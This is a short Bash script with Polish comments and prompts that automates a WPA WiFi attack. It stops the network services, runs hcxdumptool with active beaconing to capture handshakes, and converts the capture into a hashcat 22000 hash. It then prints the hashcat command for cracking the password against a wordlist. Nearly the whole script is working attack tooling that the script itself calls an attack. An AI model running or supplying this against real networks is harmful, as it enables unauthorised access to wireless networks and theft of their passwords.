cat logo.txt
echo -e "\e[1;33m Wpisz nazwe folderu roboczego:\e[0m" 
read folder
mkdir $folder
echo -e "\e[1;33m Wskakujemy do folderu roboczego:\e[0m" 
cd $folder

#sudo
#echo -e "\e[1;33m Musimy poprosic o prawa roota !\e[0m"

 
echo -e "\e[1;33m Na chwile odcinam Ci neta!\e[0m" 
#zabij neta
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

echo -e "\e[1;33m Wcisnic ctrl+c aby przerwac atak !\e[0m" 
wait2
#zlapanie danych
sudo  hcxdumptool -i wlxc4e984d7a630 -o dumpfile.pcapng --active_beacon --enable_status=15
#sudo  hcxdumptool -i wlp3s0 -o dumpfile.pcapng --active_beacon --enable_status=15


wait 2
echo -e "\e[1;33m Przywracam polaczenie z internetem !\e[0m" 
#wlacz neta
sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service

#opcja
#sudo   hcxdumptool -i wlxc4e984d7a630 -o wifi.pcapng --active_beacon --enable_status=1 --filterlist_ap=mac.txt

echo -e "\e[1;33m *DOING SOME MAGIC SHIT*\e[0m" 

wait 2
#tworzenie hasha
hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng


echo -e "\e[1;33m Mamy to !\e[0m" 
echo -e "\e[1;33m Uzyj tego polecenia aby zlamac hash !\e[0m"
echo -e "\e[1;33m hashcat -m 22000 hash.hc22000 wordlist.txt \e[0m" 
 

#opcje
#hashcat -m 22000 hash.hc22000 wordlist.txt
#cat /home/nudziarz/.hashcat/hashcat.potfile

